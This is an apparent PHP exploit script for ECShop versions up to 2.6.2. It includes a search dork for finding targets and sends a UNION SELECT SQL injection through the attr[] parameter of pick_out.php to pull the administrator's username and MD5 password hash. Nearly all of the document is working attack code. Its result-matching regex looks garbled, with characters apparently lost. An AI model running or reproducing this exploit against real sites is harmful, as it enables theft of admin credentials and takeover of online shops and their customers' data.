#!/usr/bin/php   
<?php   
//本程序只作技术交流，请不要用做非法用途！！   
print_r('   
+---------------------------------------------------------------------------+   
ECShop <= v2.6.2 SQL injection / admin credentials disclosure exploit   
by puret_t   
mail: puretot at gmail dot com   
team: http://bbs.wolvez.org   
dork: "Powered by ECShop"   
+---------------------------------------------------------------------------+   
');   
/** 
* works with magic_quotes_gpc = Off 
*/   
if ($argc < 3) {   
    print_r('   
+---------------------------------------------------------------------------+   
Usage: php '.$argv[0].' host path   
host:      target server (ip/hostname)   
path:      path to ecshop   
Example:   
php '.$argv[0].' localhost /ecshop/   
+---------------------------------------------------------------------------+   
');   
    exit;   
}   
   
error_reporting(7);   
ini_set('max_execution_time', 0);   
   
$host = $argv[1];   
$path = $argv[2];   
   
$resp = send();   
preg_match('#INs(([S]+):([a-z0-9]{32}))#', $resp, $hash);   
   
if ($hash)   
    exit("Expoilt Success! admin:    $hash[1] Password(md5):    $hash[2] ");   
else   
    exit("Exploit Failed! ");   
   
function send()   
{   
    global $host, $path;   
   
    $cmd = 'cat_id=999999&attr[%27%20UNION%20Select%20CONCAT(user_name%2c0x3a%2cpassword)%20as%20goods_id%20FROM%20ecs_admin_user%20Where%20action_list%3d%27all%27%20LIMIT%201%23]=ryat';   
   
    $data = "GET ".$path."pick_out.php?".$cmd." HTTP/1.1 ";   
    $data .= "Host: $host ";   
    $data .= "Connection: Close ";   
   
    $fp = fsockopen($host, 80);   
    fputs($fp, $data);   
   
    $resp = '';   
   
    while ($fp && !feof($fp))   
        $resp .= fread($fp, 1024);   
   
    return $resp;   
}   
   
?> 